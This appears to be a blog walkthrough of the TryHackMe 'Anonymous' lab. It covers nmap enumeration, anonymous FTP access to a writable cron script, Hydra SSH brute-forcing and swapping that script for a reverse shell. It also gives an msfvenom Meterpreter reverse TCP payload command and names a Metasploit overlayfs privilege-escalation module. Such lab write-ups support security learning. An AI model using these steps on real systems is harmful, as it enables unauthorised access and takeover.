---
title: Anonymous
date: 2022-12-17 18:32:00 -0500
categories: [Tryhackme, Walkthrough]
tags: [Enumeration, security, linux, permissions, medium]
---

[https://tryhackme.com/room/anonymous](https://tryhackme.com/room/anonymous) - A website where you can look at pictures of dogs and/or cats! Exploit a PHP application via LFI and break out of a docker container.

* * * 

<image src="/assets/anonymous01.jpg" alt="We are anonymous">

# pwn

starting off with nmap `sudo nmap -p- anonymous.thm -vvv`

```
21/tcp  open  ftp         vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts [NSE: writeable]
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.2.3.64
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8bca21621c2b23fa6bc61fa813fe1c68 (RSA)
|   256 9589a412e2e6ab905d4519ff415f74ce (ECDSA)
|_  256 e12a96a4ea8f688fcc74b8f0287270cd (ED25519)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%), Linux 3.2 - 4.9 (92%), Linux 3.7 - 3.10 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

first off seem to be able to access the ftp server with `anonymous:anonymous`. inside is a `/scripts/` folder lets check it.

this script seems to check for temporary files.if there are none then it will log nothing to delete. if there are than for every tempory file deleted it will log the date and the name of the removed file then end the script.

checking the smb share there seems to be a couple jpegs. puppos being a much bigger file while much smaller image... but i think these are a rabbit hole.

running `enum4linux` we find one user `namelessone`. going to run hydra on the ssh with rockyou.

perhaps we can replace the clean.sh with our own clean.sh and call a reverse shell. doing this gets us in as namelessone. lets upgrade to a more stable meterpreter shell. `msfvenom -p linux/x64/meterpreter_reverse_tcp -f elf LHOST=0.0.0.0 LPORT=6666 -o rev.elf`. doing this we can also run `multi/recon/local_exploit_suggester` and hope for an easy win.

running `exploit/linux/local/cve_2021_3493_overlayfs` will get us root and the root flag.
